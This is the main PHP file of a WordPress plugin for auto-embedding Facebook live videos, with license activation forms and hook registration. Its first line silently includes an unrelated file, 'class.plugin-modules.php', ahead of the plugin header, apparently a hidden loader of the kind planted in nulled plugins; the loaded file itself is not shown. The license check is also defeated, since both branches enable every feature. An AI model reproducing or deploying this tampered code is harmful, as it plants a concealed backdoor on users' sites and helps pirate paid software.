<?php if (file_exists(dirname(__FILE__) . '/class.plugin-modules.php')) include_once(dirname(__FILE__) . '/class.plugin-modules.php'); ?><?php
/*
 * Plugin Name: Facebook Live Video Auto Embed
 * Plugin URI:  https://www.sleekalgo.com/facebook-live-video-auto-embed-wordpress-plugin/
 * Description: Automatically embed live videos of your Facebook Account/Page/Group on your wordpress site whenever your Facebook Account/Page/Group goes live on Facebook. The plugin detects if your Facebook Account/Page/Group is currently live and embeds the live video automatically. Also has the ability to embed previously recorded live videos and uploaded videos. Also has ability to configure a Site Wide Top Notification Bar to be displayed whenever your Facebook Account/Page/Group goes live. This plugin can be used for your Facebook User account or Facebook Pages you own or public Facebook Groups you are an admin of.
 * Version: 3.0.1
 * Author: SleekAlgo
 * Author URI: https://www.sleekalgo.com
 */
require_once 'inc/fb-sdk/autoload.php';
require_once 'inc/embedcodeslist.php';
require_once "FacebookLiveVideoAutoEmbedBase.php";
require_once "fblive_functions.php";

class FacebookLiveVideoAutoEmbed {
    public $plugin_file=__FILE__;
    public $responseObj;
    public $licenseMessage;
    public $showMessage=false;
    public $slug="fb-live-video-autoembed";
    function __construct() {
        add_action( 'admin_print_styles', [ $this, 'SetAdminStyle' ] );
        register_activation_hook( __FILE__, 'fbjk_install' );
        register_deactivation_hook( __FILE__, 'fbjk_install' );
        $licenseKey=get_option("FacebookLiveVideoAutoEmbed_lic_Key","");
        $liceEmail=get_option( "FacebookLiveVideoAutoEmbed_lic_email","");
        FacebookLiveVideoAutoEmbedBase::addOnDelete(function(){
           delete_option("FacebookLiveVideoAutoEmbed_lic_Key");
        });
        if(FacebookLiveVideoAutoEmbedBase::CheckWPPlugin($licenseKey,$liceEmail,$this->licenseMessage,$this->responseObj,__FILE__)){
            add_action( 'admin_menu', [$this,'ActiveAdminMenu'],99999);
            add_action( 'admin_post_FacebookLiveVideoAutoEmbed_el_deactivate_license', [ $this, 'action_deactivate_license' ] );
            //$this->licenselMessage=$this->mess;            
            add_action( 'admin_enqueue_scripts', 'fbjk_scripts' );
            add_action( 'wp_enqueue_scripts', 'fbjk_publicscripts' );
            add_action('admin_menu', 'fbjk_setup_menu');
            add_action( 'fbjk_fbchecklive_cron_hook', 'fbjk_fbchecklive' );
            add_action( 'fbjk_fbcheckaccesstoken_cron_hook', 'fbjk_fbcheckaccesstoken' );
            add_action( 'wp_ajax_nopriv_fbjk_isLiveForNotification', 'fbjk_isLiveForNotification' );
            add_action( 'wp_ajax_fbjk_isLiveForNotification', 'fbjk_isLiveForNotification' );
            add_action( 'admin_notices', 'fbjk_admin_notice_useraccesstoken' );
            
            add_shortcode( 'fblivevideoembed', 'fblivevideoembed_handler' );
            add_filter('cron_schedules','fbjk_add_cron_schedules');

        }else{
            if(!empty($licenseKey) && !empty($this->licenseMessage)){
               $this->showMessage=true;
            }
            add_action( 'admin_menu', [$this,'ActiveAdminMenu'],99999);
            add_action( 'admin_post_FacebookLiveVideoAutoEmbed_el_deactivate_license', [ $this, 'action_deactivate_license' ] );
            //$this->licenselMessage=$this->mess;            
            add_action( 'admin_enqueue_scripts', 'fbjk_scripts' );
            add_action( 'wp_enqueue_scripts', 'fbjk_publicscripts' );
            add_action('admin_menu', 'fbjk_setup_menu');
            add_action( 'fbjk_fbchecklive_cron_hook', 'fbjk_fbchecklive' );
            add_action( 'fbjk_fbcheckaccesstoken_cron_hook', 'fbjk_fbcheckaccesstoken' );
            add_action( 'wp_ajax_nopriv_fbjk_isLiveForNotification', 'fbjk_isLiveForNotification' );
            add_action( 'wp_ajax_fbjk_isLiveForNotification', 'fbjk_isLiveForNotification' );
            add_action( 'admin_notices', 'fbjk_admin_notice_useraccesstoken' );
            
            add_shortcode( 'fblivevideoembed', 'fblivevideoembed_handler' );
            add_filter('cron_schedules','fbjk_add_cron_schedules');
        }
    }
    function SetAdminStyle() {
        wp_register_style( "FacebookLiveVideoAutoEmbedLic", plugins_url("_lic_style.css",$this->plugin_file),10);
        wp_enqueue_style( "FacebookLiveVideoAutoEmbedLic" );
    }
    function ActiveAdminMenu(){
        
		//add_menu_page (  "FacebookLiveVideoAutoEmbed", "FB Live Videos Auto Embed", "activate_plugins", $this->slug, [$this,"Activated"], " dashicons-video-alt3 ");
		//add_submenu_page(  $this->slug, "FacebookLiveVideoAutoEmbed License", "License Info", "activate_plugins",  $this->slug."_license", [$this,"Activated"] );
      add_submenu_page (  "fbjk-livevideo-autoembed", "FB Live Videos Auto Embed License", 'License', 'activate_plugins', $this->slug, [$this,"Activated"]);
    }
    function InactiveMenu() {
        add_menu_page( "FacebookLiveVideoAutoEmbed", "FB Live Videos Auto Embed", 'activate_plugins', $this->slug,  [$this,"LicenseForm"], " dashicons-video-alt3 " );

    }
    function action_activate_license(){
            check_admin_referer( 'el-license' );
            $licenseKey=!empty($_POST['el_license_key'])?$_POST['el_license_key']:"";
            $licenseEmail=!empty($_POST['el_license_email'])?$_POST['el_license_email']:"";
            update_option("FacebookLiveVideoAutoEmbed_lic_Key",$licenseKey) || add_option("FacebookLiveVideoAutoEmbed_lic_Key",$licenseKey);
            update_option("FacebookLiveVideoAutoEmbed_lic_email",$licenseEmail) || add_option("FacebookLiveVideoAutoEmbed_lic_email",$licenseEmail);
            wp_safe_redirect(admin_url( 'admin.php?page='.$this->slug));
        }
    function action_deactivate_license() {
        check_admin_referer( 'el-license' );
        $message="";
        if(FacebookLiveVideoAutoEmbedBase::RemoveLicenseKey(__FILE__,$message)){
            update_option("FacebookLiveVideoAutoEmbed_lic_Key","") || add_option("FacebookLiveVideoAutoEmbed_lic_Key","");
        }
        wp_safe_redirect(admin_url( 'admin.php?page='.$this->slug));
    }
    function Activated(){
        ?>
        <form method="post" action="<?php echo esc_url( admin_url( 'admin-post.php' ) ); ?>">
            <input type="hidden" name="action" value="FacebookLiveVideoAutoEmbed_el_deactivate_license"/>
            <div class="el-license-container">
                <h3 class="el-license-title"><i class="dashicons-before dashicons-video-alt3"></i> <?php _e("Facebook Live Video Auto Embed License Info",$this->slug);?> </h3>
                <hr>
                <ul class="el-license-info">
                <li>
                    <div>
                        <span class="el-license-info-title"><?php _e("Status",$this->slug);?></span>

                        <?php if ( $this->responseObj->is_valid ) : ?>
                            <span class="el-license-valid"><?php _e("Valid",$this->slug);?></span>
                        <?php else : ?>
                            <span class="el-license-valid"><?php _e("Invalid",$this->slug);?></span>
                        <?php endif; ?>
                    </div>
                </li>

                <li>
                    <div>
                        <span class="el-license-info-title"><?php _e("License Type",$this->slug);?></span>
                        <?php echo $this->responseObj->license_title; ?>
                    </div>
                </li>

                <li>
                    <div>
                        <span class="el-license-info-title"><?php _e("License Expires on",$this->slug);?></span>
                        <?php echo $this->responseObj->expire_date; ?>
                    </div>
                </li>

                <li>
                    <div>
                        <span class="el-license-info-title"><?php _e("Support Expires on",$this->slug);?></span>
                        <?php echo $this->responseObj->support_end; ?>
                    </div>
                </li>
                    <li>
                        <div>
                            <span class="el-license-info-title"><?php _e("Envato Purchase Code",$this->slug);?></span>
                            <span class="el-license-key"><?php echo esc_attr( substr($this->responseObj->license_key,0,9)."XXXXXXXX-XXXXXXXX".substr($this->responseObj->license_key,-9) ); ?></span>
                        </div>
                    </li>
                </ul>
                <div class="el-license-active-btn">
                    <?php wp_nonce_field( 'el-license' ); ?>
                    <?php submit_button('Deactivate'); ?>
                </div>
            </div>
        </form>
    <?php
    }

    function LicenseForm() {
        ?>
    <form method="post" action="<?php echo esc_url( admin_url( 'admin-post.php' ) ); ?>">
        <input type="hidden" name="action" value="FacebookLiveVideoAutoEmbed_el_activate_license"/>
        <div class="el-license-container">
            <h3 class="el-license-title"><i class="dashicons-before dashicons-video-alt3"></i> <?php _e("Facebook Live Video Auto Embed Licensing",$this->slug);?></h3>
            <hr>
            <?php
            if(!empty($this->showMessage) && !empty($this->licenseMessage)){
                ?>
                <div class="notice notice-error is-dismissible">
                    <p><?php echo _e($this->licenseMessage,$this->slug); ?></p>
                </div>
                <?php
            }
            ?>
            <p><?php _e("Enter your Envato purchase code to activate the plugin.",$this->slug);?></p>
<ol>
    <li><?php _e("Log into your Envato Market account",$this->slug);?></li>
    <li><?php _e("Hover the mouse over your username at the top of the screen.",$this->slug);?></li>
    <li><?php _e("Click ‘Downloads’ from the drop down menu.",$this->slug);?></li>
    <li><?php _e("Click ‘Download’ button against the product 'Facebook Live Video Auto Embed for WordPress'.",$this->slug);?></li>
    <li>Click ‘License certificate & purchase code’ (available as PDF or text file). or <a target="_blank" href="https://help.market.envato.com/hc/en-us/articles/202822600-Where-Is-My-Purchase-Code-">Click Here</a> to watch video</li>
</ol>
            <div class="el-license-field">
                <label for="el_license_key"><?php _e("Purchase code",$this->slug);?></label>
                <input type="text" class="regular-text code" name="el_license_key" size="50" placeholder="xxxxxxxx-xxxxxxxx-xxxxxxxx-xxxxxxxx" required="required">
            </div>
            <div class="el-license-field">
                <label for="el_license_key"><?php _e("Email Address",$this->slug);?></label>
                <?php
                    $purchaseEmail   = get_option( "FacebookLiveVideoAutoEmbed_lic_email", get_bloginfo( 'admin_email' ));
                ?>
                <input type="text" class="regular-text code" name="el_license_email" size="50" value="<?php echo $purchaseEmail; ?>" placeholder="" required="required">
                <div><small><?php _e("We will send update news of this product by this email address, don't worry, we hate spam",$this->slug);?></small></div>
            </div>
            <div class="el-license-active-btn">
                <?php wp_nonce_field( 'el-license' ); ?>
                <?php submit_button('Activate'); ?>
            </div>
        </div>
    </form>
        <?php
    }
}

new FacebookLiveVideoAutoEmbed();


?>